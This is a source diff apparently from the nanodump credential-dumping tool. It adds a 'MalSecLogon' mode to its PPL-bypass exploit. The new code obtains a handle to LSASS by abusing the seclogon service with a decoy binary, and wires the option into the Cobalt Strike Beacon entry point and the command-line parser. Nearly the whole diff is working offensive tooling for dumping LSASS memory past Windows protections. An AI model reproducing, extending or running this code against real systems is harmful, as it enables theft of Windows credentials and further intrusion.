@@ -27,7 +27,9 @@ BOOL run_ppl_bypass_exploit(
     IN BOOL use_valid_sig,
     IN BOOL fork_lsass,
     IN BOOL snapshot_lsass,
-    IN BOOL duplicate_handle)
+    IN BOOL duplicate_handle,
+    IN BOOL use_malseclogon,
+    IN LPCSTR malseclogon_target_binary)
 {
     BOOL bCurrentUserIsSystem = FALSE;
     HANDLE hSystemToken = NULL;
@@ -443,6 +445,8 @@ BOOL run_ppl_bypass_exploit(
         fork_lsass,
         snapshot_lsass,
         duplicate_handle,
+        use_malseclogon,
+        malseclogon_target_binary,
         &pwszCommandLine);
     if (!success)
         goto end;
@@ -638,6 +642,8 @@ BOOL prepare_ppl_command_line(
     IN BOOL fork_lsass,
     IN BOOL snapshot_lsass,
     IN BOOL duplicate_handle,
+    IN BOOL use_malseclogon,
+    IN LPCSTR malseclogon_target_binary,
     OUT LPWSTR* command_line)
 {
     WCHAR wszSystemDir[MAX_PATH] = { 0 };
@@ -668,7 +674,7 @@ BOOL prepare_ppl_command_line(
     wcsncat(*command_line, PPL_BINARY, size);
     // dump path
     wchar_t dump_path_w[MAX_PATH];
-    mbstowcs(dump_path_w, dump_path, size);
+    mbstowcs(dump_path_w, dump_path, MAX_PATH);
     wcsncat(*command_line, L" -w ", size);
     wcsncat(*command_line, dump_path_w, size);
     // --fork
@@ -683,6 +689,15 @@ BOOL prepare_ppl_command_line(
     // --dup
     if (duplicate_handle)
         wcsncat(*command_line, L" -d", size);
+    // --malseclogon
+    if (use_malseclogon)
+    {
+        wcsncat(*command_line, L" -m", size);
+        wchar_t malseclogon_target_binary_w[MAX_PATH];
+        mbstowcs(malseclogon_target_binary_w, malseclogon_target_binary, MAX_PATH);
+        wcsncat(*command_line, L" -b ", size);
+        wcsncat(*command_line, malseclogon_target_binary_w, size);
+    }
 
     return TRUE;
 }
@@ -1438,12 +1453,14 @@ BOOL impersonate_local_service(
 
 void go(char* args, int length)
 {
-    datap          parser;
-    BOOL           fork_lsass           = FALSE;
-    BOOL           snapshot_lsass       = FALSE;
-    BOOL           duplicate_handle     = FALSE;
-    LPCSTR         dump_path            = NULL;
-    BOOL           use_valid_sig        = FALSE;
+    datap  parser;
+    BOOL   fork_lsass                = FALSE;
+    BOOL   snapshot_lsass            = FALSE;
+    BOOL   duplicate_handle          = FALSE;
+    LPCSTR dump_path                 = NULL;
+    BOOL   use_valid_sig             = FALSE;
+    BOOL   use_malseclogon           = FALSE;
+    LPCSTR malseclogon_target_binary = NULL;
     unsigned char* nanodump_ppl_dll     = NULL;
     int            nanodump_ppl_dll_len = 0;
 
@@ -1453,6 +1470,8 @@ void go(char* args, int length)
     fork_lsass = (BOOL)BeaconDataInt(&parser);
     snapshot_lsass = (BOOL)BeaconDataInt(&parser);
     duplicate_handle = (BOOL)BeaconDataInt(&parser);
+    use_malseclogon = (BOOL)BeaconDataInt(&parser);
+    malseclogon_target_binary = BeaconDataExtract(&parser, NULL);
     nanodump_ppl_dll = (unsigned char*)BeaconDataExtract(&parser, &nanodump_ppl_dll_len);
 
     run_ppl_bypass_exploit(
@@ -1462,7 +1481,9 @@ void go(char* args, int length)
         use_valid_sig,
         fork_lsass,
         snapshot_lsass,
-        duplicate_handle);
+        duplicate_handle,
+        use_malseclogon,
+        malseclogon_target_binary);
 }
 
 #endif
@@ -1471,7 +1492,7 @@ void go(char* args, int length)
 
 void usage(char* procname)
 {
-    PRINT("usage: %s --write C:\\Windows\\Temp\\doc.docx [--valid] [--fork] [--snapshot] [--dup] [--help]", procname);
+    PRINT("usage: %s --write C:\\Windows\\Temp\\doc.docx [--valid] [--fork] [--snapshot] [--dup] [--malseclogon] [--binary C:\\Windows\\notepad.exe] [--help]", procname);
     PRINT("    --write DUMP_PATH, -w DUMP_PATH");
     PRINT("            filename of the dump");
     PRINT("    --valid, -v");
@@ -1482,17 +1503,23 @@ void usage(char* procname)
     PRINT("            snapshot the target process before dumping");
     PRINT("    --dup, -d");
     PRINT("            duplicate an existing " LSASS " handle");
+    PRINT("    --malseclogon, -m");
+    PRINT("            obtain a handle to " LSASS " by (ab)using seclogon");
+    PRINT("    --binary BIN_PATH, -b BIN_PATH");
+    PRINT("            full path to the decoy binary used with --dup and --malseclogon");
     PRINT("    --help, -h");
     PRINT("            print this help message and leave");
 }
 
 int main(int argc, char* argv[])
 {
-    BOOL   fork_lsass       = FALSE;
-    BOOL   snapshot_lsass   = FALSE;
-    BOOL   duplicate_handle = FALSE;
-    LPCSTR dump_path        = NULL;
-    BOOL   use_valid_sig    = FALSE;
+    BOOL   fork_lsass                = FALSE;
+    BOOL   snapshot_lsass            = FALSE;
+    BOOL   duplicate_handle          = FALSE;
+    LPCSTR dump_path                 = NULL;
+    BOOL   use_valid_sig             = FALSE;
+    BOOL   use_malseclogon           = FALSE;
+    LPCSTR malseclogon_target_binary = NULL;
 
 #ifdef _M_IX86
     if(local_is_wow64())
@@ -1522,17 +1549,38 @@ int main(int argc, char* argv[])
         else if (!strncmp(argv[i], "-f", 3) ||
                  !strncmp(argv[i], "--fork", 7))
         {
-            fork_lsass = TRUE;
+            // TODO: make this work
+            PRINT("The parameter --fork is not allowed.");
+            return 0;
+            //fork_lsass = TRUE;
         }
         else if (!strncmp(argv[i], "-s", 3) ||
                  !strncmp(argv[i], "--snapshot", 11))
         {
-            snapshot_lsass = TRUE;
+            // TODO: make this work
+            PRINT("The parameter --snapshot is not allowed.");
+            return 0;
+            //snapshot_lsass = TRUE;
         }
         else if (!strncmp(argv[i], "-d", 3) ||
                  !strncmp(argv[i], "--dup", 6))
         {
             duplicate_handle = TRUE;
+        }
+        else if (!strncmp(argv[i], "-m", 3) ||
+                 !strncmp(argv[i], "--malseclogon", 14))
+        {
+            use_malseclogon = TRUE;
+        }
+        else if (!strncmp(argv[i], "-b", 3) ||
+                 !strncmp(argv[i], "--binary", 8))
+        {
+            if (i + 1 >= argc)
+            {
+                PRINT("missing --binary value");
+                return -1;
+            }
+            malseclogon_target_binary = argv[++i];
         }
         else if (!strncmp(argv[i], "-h", 3) ||
                  !strncmp(argv[i], "--help", 7))
@@ -1565,6 +1613,32 @@ int main(int argc, char* argv[])
         return -1;
     }
 
+    if (use_malseclogon && !duplicate_handle)
+    {
+        PRINT("In this mode, if MalSecLogon is being used, --dup must be provided.");
+        return -1;
+    }
+
+    if (use_malseclogon && !malseclogon_target_binary)
+    {
+        PRINT("In this mode, if MalSecLogon is being used, --binary must be provided.");
+        return -1;
+    }
+
+    if (malseclogon_target_binary &&
+        !is_full_path(malseclogon_target_binary))
+    {
+        PRINT("You need to provide the full path: %s", malseclogon_target_binary);
+        return -1;
+    }
+
+    if (malseclogon_target_binary &&
+        !file_exists(malseclogon_target_binary))
+    {
+        PRINT("The binary \"%s\" does not exists.", malseclogon_target_binary);
+        return -1;
+    }
+
     run_ppl_bypass_exploit(
         nanodump_ppl_dll,
         nanodump_ppl_dll_len,
@@ -1572,7 +1646,9 @@ int main(int argc, char* argv[])
         use_valid_sig,
         fork_lsass,
         snapshot_lsass,
-        duplicate_handle);
+        duplicate_handle,
+        use_malseclogon,
+        malseclogon_target_binary);
 
     return 0;
 }
